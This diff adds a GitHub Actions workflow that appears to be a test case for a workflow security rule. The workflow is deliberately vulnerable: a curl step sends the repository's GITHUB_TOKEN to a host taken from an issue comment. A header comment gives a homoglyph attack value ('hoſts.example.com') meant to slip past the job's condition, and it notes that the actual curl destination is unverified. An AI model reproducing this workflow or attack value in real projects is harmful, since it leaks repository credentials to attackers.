@@ -1,0 +1,26 @@
+# situation: on issue_comment, a job runs only when the comment's body is
+#   hosts.example.com, and a step sends the repository's token to the host
+#   that env.HOST, which holds the body, names.
+# reason: the job's if lets the body be only the string hosts.example.com,
+#   ignoring the case of its letters; GitHub's server, which evaluates the
+#   if of a job, also takes the long s as equal to s. The author of this
+#   example has not checked whether a host name with a long s names another
+#   host than the name with s, and where curl sends the request.
+# cause: the rule does not treat a value that the if of the job compares
+#   with such a string as written by the attacker.
+# attack-value: github.event.comment.body = "hoſts.example.com"
+# attack-run-behavior: GitHub's server takes the value as equal to
+#   hosts.example.com, so the job runs, and curl gets hoſts.example.com as
+#   the host.
+on:
+  issue_comment:
+    types: [created]
+jobs:
+  j:
+    if: github.event.comment.body == 'hosts.example.com'
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          HOST: ${{ github.event.comment.body }}
+        run: |
+          curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "https://$HOST/report"
